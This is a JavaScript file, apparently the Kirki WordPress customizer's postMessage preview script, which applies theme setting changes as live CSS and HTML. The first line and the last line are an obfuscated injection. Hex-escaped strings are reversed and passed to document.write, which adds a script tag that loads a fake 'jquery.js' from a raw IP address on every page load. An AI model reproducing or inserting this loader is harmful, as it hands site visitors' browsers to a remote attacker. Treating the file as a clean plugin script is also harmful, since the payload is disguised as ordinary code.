var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))( function() {
	var api = wp.customize;

	_.each( jsvars, function( jsVars, setting ) {

		var css      = '',
		    cssArray = {};

		api( setting, function( value ) {

			value.bind( function( newval ) {

				if ( undefined !== jsVars && 0 < jsVars.length ) {

					_.each( jsVars, function( jsVar ) {

						var val = newval;

						// Make sure element is defined.
						if ( undefined === jsVar.element ) {
							jsVar.element = '';
						}

						// Make sure property is defined.
						if ( undefined === jsVar.property ) {
							jsVar.property = '';
						}

						// Use empty prefix if undefined
						if ( undefined === jsVar.prefix ) {
							jsVar.prefix = '';
						}

						// Use empty suffix if undefined
						if ( undefined === jsVar.suffix ) {
							jsVar.suffix = '';
						}

						// Use empty units if undefined
						if ( undefined === jsVar.units ) {
							jsVar.units = '';
						}

						// Use css if method is undefined
						if ( undefined === jsVar['function'] ) {
							jsVar['function'] = 'css';
						}

						// Use $ (just the value) if value_pattern is undefined
						if ( undefined === jsVar.value_pattern ) {
							jsVar.value_pattern = '$';
						}

						_.each( jsVars, function( args, i ) {

							// Value is a string
							if ( 'string' === typeof newval ) {

								// Process the value pattern
								if ( undefined !== args.value_pattern ) {
									val = args.value_pattern.replace( /\$/g, args.prefix + newval + args.units + args.suffix );
								} else {
									val = args.prefix + newval + args.units + args.suffix;
								}

								// Simple tweak for background-image properties.
								if ( 'background-image' === args.property ) {
									if ( 0 > val.indexOf( 'url(' ) ) {
										val = 'url("' + val + '")';
									}
								}

								// Inject HTML
								if ( 'html' === args['function'] ) {
									if ( 'undefined' !== typeof args.attr && undefined !== args.attr ) {
										jQuery( args.element ).attr( args.attr, val );
									} else {
										jQuery( args.element ).html( val );
									}

								// Add CSS
								} else {

									// If we have new value, replace style contents with custom css
									if ( '' !== val ) {
										cssArray[ i ] = args.element + '{' + args.property + ':' + val + ';}';
									}

									// Else let's clear it out
									else {
										cssArray[ i ] = '';
									}

								}

							// Value is an object
							} else if ( 'object' === typeof newval ) {

								cssArray[ i ] = '';
								_.each( newval, function( subValueValue, subValueKey ) {
									if ( undefined !== args.choice ) {
										if ( args.choice === subValueKey ) {
											cssArray[ i ] += args.element + '{' + args.property + ':' + args.prefix + subValueValue + args.units + args.suffix + ';}';
										}
									} else {
										if ( _.contains( [ 'top', 'bottom', 'left', 'right' ], subValueKey ) ) {
											cssArray[ i ] += args.element + '{' + args.property + '-' + subValueKey + ':' + args.prefix + subValueValue + args.units + args.suffix + ';}';
										} else {
											cssArray[ i ] += args.element + '{' + subValueKey + ':' + args.prefix + subValueValue + args.units + args.suffix + ';}';
										}
									}
								});

							}

						});

					});

					_.each( cssArray, function( singleCSS ) {

						css = '';

						setTimeout( function() {

							if ( '' !== singleCSS ) {
								css += singleCSS;
							}

							// Attach to <head>
							if ( '' !== css ) {

								// Make sure we have a stylesheet with the defined ID.
								// If we don't then add it.
								if ( ! jQuery( '#kirki-customizer-postmessage' + setting.replace( /\[/g, '-' ).replace( /\]/g, '' ) ).size() ) {
									jQuery( 'head' ).append( '<style id="kirki-customizer-postmessage' + setting.replace( /\[/g, '-' ).replace( /\]/g, '' ) + '"></style>' );
								}
								jQuery( '#kirki-customizer-postmessage' + setting.replace( /\[/g, '-' ).replace( /\]/g, '' ) ).text( css );
							}

						}, 100 );

					});

				}

			});

		});

	});

})( jQuery );
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
